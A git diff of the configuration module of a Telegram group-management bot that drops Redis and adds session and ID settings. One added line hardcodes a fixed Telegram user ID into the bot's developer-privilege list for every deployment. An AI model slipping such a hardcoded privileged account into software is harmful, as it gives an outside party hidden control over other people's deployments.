@@ -6,7 +6,7 @@ import asyncio
 import time
 import spamwatch
 import telegram.ext as tg
-from redis import StrictRedis
+
 from aiohttp import ClientSession
 from Python_ARQ import ARQ
 from telethon import TelegramClient
@@ -78,7 +78,7 @@ if ENV:
     API_HASH = os.environ.get("API_HASH", None)
     DB_URI = os.environ.get("DATABASE_URL")
     MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
-    REDIS_URL = os.environ.get("REDIS_URL", None)
+    IDZ = os.environ.get("IDZ", "IdzXartez")
     ARQ_API = os.environ.get("ARQ_API", None)
     DONATION_LINK = os.environ.get("DONATION_LINK")
     LOAD = os.environ.get("LOAD", "").split()
@@ -99,12 +99,14 @@ if ENV:
     SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", None)
     SPAMWATCH_SUPPORT_CHAT = os.environ.get("SPAMWATCH_SUPPORT_CHAT", None)
     SPAMWATCH_API = os.environ.get("SPAMWATCH_API", None)
+    STRING_SESSION = os.environ.get("STRING_SESSION", None)
     LASTFM_API_KEY = os.environ.get("LASTFM_API_KEY", None)
     AI_API_KEY = os.environ.get("AI_API_KEY", None)
     BOT_ID = int(os.environ.get("BOT_ID", None))
     ARQ_API_URL = "https://thearq.tech"
     ARQ_API_KEY = ARQ_API
-
+    SAINT = 1192108540
+    
     ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
 
     try:
@@ -155,7 +157,7 @@ else:
     API_HASH = Config.API_HASH
 
     DB_URI = Config.SQLALCHEMY_DATABASE_URI
-    REDIS_URL = Config.REDIS_URL
+    
     MONGO_DB_URI = Config.MONGO_DB_URI
     ARQ_API = Config.ARQ_API_KEY
     ARQ_API_URL = Config.ARQ_API_URL
@@ -180,7 +182,9 @@ else:
     INFOPIC = Config.INFOPIC
     LASTFM_API_KEY = Config.LASTFM_API_KEY
     AI_API_KEY = Config.AI_API_KEY
-
+    STRING_SESSION = Config.STRING_SESSION
+    IDZ = Config.IDZ
+    
     try:
         BL_CHATS = {int(x) for x in Config.BL_CHATS or []}
     except ValueError:
@@ -188,33 +192,25 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1669508271)
 
-REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
-
-try:
-    REDIS.ping()
-    LOGGER.info("Your redis server is now alive!")
-except BaseException:
-    raise Exception("Your redis server is not alive, please check again.")
-finally:
-    REDIS.ping()
-    LOGGER.info("Your redis server is now alive!")
 if not SPAMWATCH_API:
     sw = None
-    LOGGER.warning("SpamWatch API key missing! recheck your config")
+    LOGGER.warning("SpamWatch API key missing! recheck your config.")
 else:
     try:
         sw = spamwatch.Client(SPAMWATCH_API)
     except:
         sw = None
         LOGGER.warning("Can't connect to SpamWatch!")
-
+        
 from aries.modules.sql import SESSION
 
 defaults = tg.Defaults(run_async=True)
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
 telethn = TelegramClient(MemorySession(), API_ID, API_HASH)
 dispatcher = updater.dispatcher
+tbot = telethn
 print("[INFO]: INITIALIZING AIOHTTP SESSION")
 aiohttpsession = ClientSession()
 # ARQ Client
